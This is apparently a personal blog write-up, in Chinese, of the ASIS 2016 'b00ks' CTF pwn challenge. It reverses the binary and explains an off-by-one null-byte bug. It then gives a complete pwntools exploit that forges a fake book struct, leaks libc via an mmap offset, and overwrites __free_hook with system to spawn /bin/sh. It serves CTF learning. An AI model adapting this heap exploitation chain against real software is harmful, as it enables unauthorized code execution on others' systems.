---
title: "Asis_2016_b00ks"
description: 
date: 2022-10-25
image: 
math: 
license: 
hidden: false
comments: true
draft: false
categories:
    - pwn_exercise
---

这道题是第一次通过一步步调试在本地打通，参考了很多大佬的WP，记录一下。





## 分析功能及数据结构

![](/img/b00ks/image-20221025152027671.png)

checksec之后可知是amd64的结构，放入IDA64中分析，进入找到main函数按F5键查看伪代码。

### main

![](/img/b00ks/image-20221025152231748.png)

### sub_A77

首先初始化stdout和stdin，sub_A77函数输出一行文字

![](/img/b00ks/image-20221025152349337.png)

### sub_B6D

sub_B6D函数需要输入作者名称，将读入名字author_name，其中`32LL`为0x20的长度，还需要进一步看sub_9F5函数。

![](/img/b00ks/image-20221025152439174.png)

sub_B6D函数最后效果为将name读入到0新02040位置。

![](/img/b00ks/image-20221025154415885.png)

### sub_9F5

sub_9F5函数首先需要输入的a2大于0，即长度大于0，在for循环中i从0开始计数，一步一步读入输入的字符，其中，read()函数的返回值为实际读到的字节数，若每次读到的字节数不为1则退出返回1，然后在sub_B60函数中报错读入失败，若此时写向buf的值为10，退出循环，每次循环中，`++buf`buf自增。在该处为循环了32次，当i与a2相等后，跳出循环，buf所指向的位置会赋值为0

![](/img/b00ks/image-20221025152645662.png)

### sub_A89

**sub_9F5即为漏洞函数**，存在off by one漏洞，当输入数据长度正好为a2时，会向buf中越界写入一个字节`'\x00'`，假设a2为32，则通过read读取32个字符后，在++buf后，让第33个字符的位置被`'\x00'`覆盖。

接着进入while语句条件中的sub_A89函数，效果为打印出菜单并且只允许输入1到6的数字。

![](/img/b00ks/image-20221025154600040.png)

进入while循环是switch语句分支为6种不同的情况，包括创建图书结构(sub_F55)、删除图书结构(sub_BBD)、编辑书本描述(sub_E17)、展示图书(sub_D1F)、重新编辑作者名字(sub_B6D)、错误选择。

### sub_F55

该函数主要用于创建书本的结构，首先输入书本名字大小到v2，若v2大于等于0则malloc会分配name buffer(≤32)，若分配成功，ptr指向分配的空间，继续通过sub_9F5读入名字到ptr指向的地址，失败则输出“fail to read name"，成功则进入else；

else中v2赋值为0，scanf输入书本描述的大小给v2，此时malloc再一次分配description buffer，此处的大小自定义，v6指向分配的空间，若成功，则继续输入书本的描述，此时v0赋值为v6，sub_9F5读入，成功读入后则进入else；

![](/img/b00ks/image-20221025155340205.png)

### sub_B24

sub_B24函数主要在off_202010到之后的共20的位置查看是否有值，若为0，则说明有空闲位置，返回空闲的位置所代表的i。

![](/img/b00ks/image-20221025160305683.png)

所以此时v3为返回的那个i值，若v3不为-1，则进入else即创建结构体操作；

首先malloc分配book结构体用于保存book的信息，v4指向该空间，若分配成功，则有

```c
*((_DWORD *)v4 + 6) = v2;//description size ->6个Dword, 6x(2x1)x2 = 24字节
*((_QWORD *)off_202010 + v3) = v4;//book
*((_QWORD *)v4 + 2) = v6;//description -> 2x(4x1)x2 = 16字节
*((_QWORD *)v4 + 1) = ptr;//name -> 1x(4x1)x2 = 8字节
*(_DWORD *)v4 = ++unk_202024;//每本书的ID -> 0字节
```

该处五行代码：v2是description size存放在v4偏移6个dword位置，v3为返回的i值，此处是将指向书本结构的v4存放在off_202010偏移i的位置，v6是description存放在v4偏移2个qword位置，ptr是name存放在v4偏移1个qword的位置。

**补充：结构体内存布局对齐**

64位程序，机器字长8个字节，id是int型数据，存入堆中只存了4个字节，而接下来存的name是一个指针型数据，64位系统中为8字节，所以将其放入后面新的8字节中，int后空出来的4字节空白补齐，此时共16字节。

**补充：强制类型转化**`*(_DWORD *)`:

```c
int v3 += *(_DWORD *)(4LL*i+a1);
//从a1[4LL*i]开始按DWORD格式取出4字节
*(_DWORD *)(a1+15) = 12;
//将a1的值加上15，然后将这个值强制转换为整数指针，并往这个指针指向的地址内存写入一个“12”的整数

//DWORD：unsigned long无符号的
```

![](/img/b00ks/image-20221025155403683.png)

![](/img/b00ks/image-20221025155423752.png)

### sub_BBD

输入要删除的id，然后进行free并且赋值为0。

![](/img/b00ks/image-20221025161124844.png)

### sub_E17

![](/img/b00ks/image-20221025161226153.png)

编辑book description

### sub_D1F

该函数用于展示书本book，打印id、name、description、author。从off_202010所指向的那一些地址读出数据。

![](/img/b00ks/image-20221025161344963.png)

通过此处的分析以及创建书本结构体的函数，我们可以得出书籍的结构体

```c
struct book_struct{
	int book_id;	            //offset:0
	char* book_name;		//offset:8 malloc(size)
	char* book_description;     //offset:16 malloc(size)
	int book_description_size;  //offset:24
}
```

共20字节：

**0-4字节**：book_id，是一堆大于0的数字，第1,2,3,4,5本书

**0x08-0x10字节**：放book_name的指针，指针里放着书的名字（字符）

**0x10-0x18字节**：放book_description的指针，指针里放着书的描述（字符）

**0x18-0x1c字节**：放着description的字符串的额最大长度，意为：若再次修改它，最多能输入多少字符

### sub_B6D

通过sub_9F5重新编辑author name

![](/img/b00ks/image-20221025161745008.png)

## Off by one

**off-by-one：指程序向缓冲区写入字节数超过了缓冲区本身的大小，并且只越界了一个字节，与边界验证不严或字符串操作有关**

- 循环语句向缓冲区写入数据，循环次数设置错误导致多写了一个字节
- 字符串操作不合适，如忽略了字符串末尾的`'\x00'`

bss中放结构，用off by null来做堆布局，堆布局使得book结构体落在可控制的堆上，结合“查”、“改”可任意地址读写，off-by-one可以基于各种缓冲区：栈、bss、堆等等。

## 实践exp

此处使用gdb插件peda会更加方便，之前使用的是pwngdb，但是对于查找某个字符peda会使用更方便。切换gdb插件：更改`~/.gdbinit`文件，将pwngdb注释掉，取消peda的注释即可。

![](/img/b00ks/image-20221025164051973.png)

其中将off_202010：global_book_struct_array，off_202018：author_name_ptr，两者指向的地址之间正好相差为32个字节(0x20)，当输入author_name长度为32时，会向author_name_ptr中越界写入一个字节`\x00`，之后创建book_struct时会将其地址保存在global_book_struct_array中，覆盖之前字符串截断符`\x00`，所以可以打印出author_name实现信息泄露。（越界写入一个字节会覆盖global_book_struct_array中的保存的第一个book_struct的地址。

### peda的find插件进行分析

gdb运行程序，进入run，输入作者名字：aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabc(32)，选择1，10，aaaaa，10，bbbbb，ctrl+C

![](/img/b00ks/image-20221025164827903.png)

![](/img/b00ks/image-20221025164901716.png)

输入find aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabc找到相应的位置

![](/img/b00ks/image-20221025164948519.png)

![](/img/b00ks/image-20221025165159813.png)

此处0x555555602040和0x555555602050存放着author_name，（a=61,b=62,c=63)，之后的0x555555602040指向的地址为book指针，查看book指针，可以发现book的结构体

```
0x5555556036f0:	0x0000000000000001 ID				0x00005555556036b0 book name
0x555555603700:	0x00005555556036d0 description		0x000000000000000a description size
0x555555603710:	0x0000000000000000					0x00000000000208f1 top chunk
0x555555603720:	0x0000000000000000					0x0000000000000000
0x555555603730:	0x0000000000000000					0x0000000000000000
```

**其中可以发现，将f0改变为00后，book1指针指向description**

继续查看book_name和description可以看到aaaaa和bbbbb

![](/img/b00ks/image-20221025165920156.png)

创建两个book：

![](/img/b00ks/image-20221025170206730.png)

![](/img/b00ks/image-20221025170553060.png)

可以看到大致的书本结构以及第二本书的结构。

### 利用技巧与思路

- **edit author_name的函数使得**：可将book1地址最后一个字节修改为00，且当create book后，book1的地址会将33位的NULL字节覆盖，打印author_name可得到book1的地址。

1. **设置author_name长度为32,33位的`\x00`被book1地址覆写后，输出author_name即可泄露book1的地址**
2. **通过修改author_name，使得后两位变为00，布置使得book1指针指向book1的description**
3. **修改book1的description，使得description内容为fake_book1**
4. **fake_book1中的book_name和description指针，指针指向book2的description**
5. **输出book1，则book1的description即为fake_book1，可打印出book2的description的地址，实现泄露，得到libc_base**
6. **将book2的description设置为`__free_hook`函数，将book2的name设置为`system("/bin/sh")`函数，再free book2，调用`__free_hook`，执行`system("/bin/sh")`**

### 基本函数定义

```python
from pwn import *
context.log_level="debug"
io = process("./b00ks")
#libc = ELF("libc-2.27.so")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def createbook(name_size, name, des_size, des):
    io.readuntil("> ")
    io.sendline("1")
    io.readuntil(": ")
    io.sendline(str(name_size))
    io.readuntil(": ")
    io.sendline(name)
    io.readuntil(": ")
    io.sendline(str(des_size))
    io.readuntil(": ")
    io.sendline(des)

def deletebook(id):
    io.readuntil("> ")
    io.sendline("2")
    io.readuntil(": ")
    io.sendline(str(id))

def editbook(id, new_des):
    io.readuntil("> ")
    io.sendline("3")
    io.readuntil(": ")
    io.sendline(str(id))
    io.readuntil(": ")
    io.sendline(new_des)

def printbook(id):
    io.readuntil("> ")
    io.sendline("4")
    io.readuntil(": ")
    for i in range(id):
        book_id = int(io.readline()[:-1])//-1为最后一个位置
        io.readuntil(": ")				 //[:-1]:从(0)到(-1之前的数)
        book_name = io.readline()[:-1]
        io.readuntil(": ")
        book_des = io.readline()[:-1]
        io.readuntil(": ")
        book_author = io.readline()[:-1]
    return book_id, book_name, book_des, book_author

def changeauthor(authorname):
    io.readuntil("> ")
    io.sendline("5")
    io.readuntil(": ")
    io.sendline(authorname)
```

### 创建book1

```python
io.recvuntil("author name:")
io.sendline("a" * 30 + "bc")
createbook(140,"kkbook1",250,"haha")
gdb.attach(io)
```

![](/img/b00ks/image-20221025193027006.png)

### print得book1地址

```python
book1_id,book1_name,book1_des,book_author = printbook(1)
book1_addr = u64(book_author[32:32+6].ljust(8,b'\x00'))#收6个字节最后用'\x00'连接为8字节
print("book1_addr -->"+hex(book1_addr))
#print("book1_addr --> 0x%x"%book1_addr) 3行和4行为同样效果
gdb.attach(io)
```

此时0x56180ce02070所指向的空间，由于最后的33位的`\x00`被book1的指针覆盖，所以打印author_name时c后面的会被打印出来，即为book1地址，如图得到book1的地址

![](/img/b00ks/image-20221025194124258.png)

### 构造fake_book1

此时通过修改book1的description，使得description的内容为fake_book1

```python
payload = b"a"*176 + p64(0x01) + p64(book1_addr + 0x40)*2 + p64(0xffff)
editbook(1,payload) #fake_book1
gdb.attach(io)
#0x01对应于book1,0xffff为description_size，
```

![](/img/b00ks/image-20221025194929356.png)

之后会将460的后两位覆盖为00，所以会指向400位置，此时伪造的fake_book是从description（即350位置）调试好位置后覆盖到的。

### 创建book2，修改author_name

创建book2要尽量使申请空间大，大于0x200000将会使用到mmap的帮助，且**mmap与libc之间存在固定的偏移，即book_name即为mmap地址**

```python
createbook(0x21000,"/bin/sh",0x21000,"/bin/sh")#填充为/bin/sh
changeauthor("a"*30 + "00")#"00"可以更改为任何两个数
gdb.attach(io)
```

![](/img/b00ks/image-20221025200239349.png)

此时book1指针最后两位被覆盖为00，指向fake_book1，查看发现book1_description（0x00005578657184a0）此时为book2指针指向的book2_description，所以之前的构造fake_book1中的代码中的`book1_addr + 0x40`实则为计算好的关于book1_addr偏移到book2的description的指针，即：60+40=a0

**此时fake_book1中的book_name和description均指向book2的description。可以从图中看出，book2_name - book2_description = e6010 - c4010 = 0x22000，即可得下一步操作中的book_name_addr**

### 输出book1得到book2_description地址

```python
book_id, book_name, book_des, book_author = printbook(1)
book2_des = u64(book_des.ljust(8,b'\x00'))
book2_name = book2_des + 0x22000
print("book2_des_addr -->" + hex(book2_des))
print("book2_name_addr -->" + hex(book2_name))
gdb.attach(io)
```

![](/img/b00ks/image-20221025202226764.png)

![](/img/b00ks/image-20221025202507871.png)

获得book2_description地址和book2_name地址

### 泄露得到libc地址

```python
libc_base = book2_name + 0x21ff0
print("libc_base_addr -->" + hex(libc_base))
gdb.attach(io)
```

通过查看vmmap我们可以知道libc基址，由于mmap申请，mmap与libc之间存在固定的偏移，则申请出来的book2_name也有固定的偏移，如图通过计算0x00007f2bba6b0000 - 0x7f2bba68e010 = 0x21FF0，所以将book2_name+0x21ff0得到libc基址。

![](/img/b00ks/image-20221025203052919.png)

![](/img/b00ks/image-20221025203210290.png)

泄露得到libc基址：

![](/img/b00ks/image-20221025203346725.png)

### 获得system和free_hook地址

```python
system=libc_base+libc.symbols['system']
free_hook=libc_base+libc.symbols['__free_hook']
print("free_hook_addr -->" + hex(free_hook))
print("system_addr -->" + hex(system))
```

### Getshell

```python
payload=p64(free_hook)
editbook(1, payload)
payload=p64(system)
editbook(2, payload)
deletebook(2)
#gdb.attach(io)
io.interactive
```

先将book1的description修改，即修改的是fake_book的description（0x0000556f9aed84a0），修改后该fake_book1的description的内容为一个指向freehook的指针地址，然后的操作是将freehook改为system。 

![](/img/b00ks/image-20221025203755878.png)

此时book2的description为free_hook指针地址

![](/img/b00ks/image-20221025204108883.png)

然后修改book2的description，使得free_hook指针地址指向system，

![](/img/b00ks/image-20221025204344639.png)

最后deletebook，删除book2时，会调用free函数，即也会调用`__free_hook`函数，相当于调用system函数，当构造book2时，其中的book2_name和book2_description均为`/bin/sh`，使得进行`system(/bin/sh)`获得shell。

![](/img/b00ks/image-20221025204924268.png)

## 完整exp如下

```python
from pwn import *
context.log_level="debug"
io = process("./b00ks")
#libc = ELF("libc-2.27.so")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def createbook(name_size, name, des_size, des):
    io.readuntil("> ")
    io.sendline("1")
    io.readuntil(": ")
    io.sendline(str(name_size))
    io.readuntil(": ")
    io.sendline(name)
    io.readuntil(": ")
    io.sendline(str(des_size))
    io.readuntil(": ")
    io.sendline(des)

def deletebook(id):
    io.readuntil("> ")
    io.sendline("2")
    io.readuntil(": ")
    io.sendline(str(id))

def editbook(id, new_des):
    io.readuntil("> ")
    io.sendline("3")
    io.readuntil(": ")
    io.sendline(str(id))
    io.readuntil(": ")
    io.sendline(new_des)

def printbook(id):
    io.readuntil("> ")
    io.sendline("4")
    io.readuntil(": ")
    for i in range(id):
        book_id = int(io.readline()[:-1])
        io.readuntil(": ")
        book_name = io.readline()[:-1]
        io.readuntil(": ")
        book_des = io.readline()[:-1]
        io.readuntil(": ")
        book_author = io.readline()[:-1]
    return book_id, book_name, book_des, book_author

def changeauthor(authorname):
    io.readuntil("> ")
    io.sendline("5")
    io.readuntil(": ")
    io.sendline(authorname)

io.recvuntil("author name:")
io.sendline("a" * 30 + "bc")
createbook(140,"kkbook1",250,"haha")
book1_id,book1_name,book1_des,book_author = printbook(1)
book1_addr = u64(book_author[32:32+6].ljust(8,b'\x00'))
print("book1_addr -->"+hex(book1_addr))
#print("book1_addr --> 0x%x"%book1_addr)
#payload = b"a"*176 + p64(0x01) + p64(book1_addr + 0x38)*2 + p64(0xffff)
payload = b"a"*176 + p64(0x01) + p64(book1_addr + 0x40)*2 + p64(0xffff)
editbook(1,payload) #fake_book1
createbook(0x21000,"/bin/sh",0x21000,"/bin/sh")
changeauthor("a"*30 + "00")
book_id, book_name, book_des, book_author = printbook(1)
book2_des = u64(book_des.ljust(8,b'\x00'))
book2_name = book2_des + 0x22000
print("book2_des_addr -->" + hex(book2_des))
print("book2_name_addr -->" + hex(book2_name))
libc_base = book2_name + 0x21ff0
print("libc_base_addr -->" + hex(libc_base))
#gdb.attach(io)
system=libc_base+libc.symbols['system']
free_hook=libc_base+libc.symbols['__free_hook']
print("free_hook_addr -->" + hex(free_hook))
print("system_addr -->" + hex(system))
payload=p64(free_hook)
editbook(1, payload)
payload=p64(system)
editbook(2, payload)
deletebook(2)
io.interactive()
```

由于该题使用的是本地的glibc，使用的是libc-3.3所以只适合于本地调试getshell，远程需要在本地连接相同的ld和libc文件，进行调试。

